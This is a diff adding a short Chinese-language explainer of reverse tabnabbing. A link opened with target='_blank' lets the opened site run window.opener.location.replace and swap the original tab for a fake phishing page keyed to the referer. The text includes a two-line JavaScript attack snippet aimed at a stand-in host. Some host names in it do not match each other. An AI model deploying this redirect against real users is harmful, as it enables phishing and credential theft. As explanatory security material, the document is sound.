@@ -1,0 +1,21 @@
+
+在你的网站 https://a.com 上存在一个链接：
+ ```html
+<a href="https://a.com" target="_blank">进入一个“邪恶”的网站</a>
+```
+
+用户点击了这个链接，在新的标签页打开了这个网站。  
+这个网站可以通过 HTTP Header 中的 Referer 属性来判断用户的来源。  
+并且，这个网站上包含着类似于这样的 JavaScript 代码：
+```js
+const url = encodeURIComponent('{{header.referer}}');
+window.opener.location.replace('https://a.fake.site/?' + url);
+```
+
+此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 https://a.fake.site/?https%3A%2F%2Fexample.com%2F。  
+
+
+恶意网站 https://a.fake.site 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。  
+
+
+用户关闭 https://an.evil.site 的标签页，回到原来的网站………………已经回不去了。
